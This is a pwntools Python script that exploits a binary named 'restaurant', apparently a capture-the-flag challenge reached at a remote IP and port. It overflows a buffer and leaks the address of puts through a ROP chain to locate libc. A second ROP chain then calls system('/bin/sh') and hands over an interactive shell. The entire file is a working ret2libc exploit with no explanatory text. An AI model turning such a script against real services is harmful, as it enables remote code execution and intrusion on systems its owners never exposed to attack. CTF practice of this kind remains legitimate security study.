from pwn import *

os.system('pkill -9 gdb')
context.terminal = ['tmux', 'splitw', '-h', '-I']
elf = ELF('restaurant')
context.arch = 'amd64'
local = False

if local:
    proc = elf.process()
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    proc = remote('138.68.182.108', 32631)
    context.noptrace = True
    libc = ELF('./libc.so.6')

gdb.attach(proc, '\n'.join([
    'c'
]))

# Find libc
rop_printf = ROP([elf])
rop_printf.call(elf.plt['puts'], [elf.got['puts']])
rop_printf.call(elf.symbols['fill'])
proc.sendline('1')
payload_printf = b''.join([
    b'a' * 40,
    rop_printf.chain()
])
proc.sendline(payload_printf)

proc.recvlines(numlines=11)
enjoy_and_payload_and_puts = proc.recvline(False)
puts = u64(enjoy_and_payload_and_puts.replace(b'Enjoy your ' + payload_printf.split(b'\x00')[0], b'').ljust(8, b'\x00'))
libc.address = puts - libc.symbols['puts']
info(f'Found libc at {hex(libc.address)}')

# Exploit libc
rop_shell = ROP([libc])
rop_shell.call(libc.symbols['puts'], [next(libc.search(b'/bin/sh'))])
rop_shell.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload_shell = b''.join([
    b'a' * 40,
    rop_shell.chain()
])
proc.sendline(payload_shell)

proc.interactive()
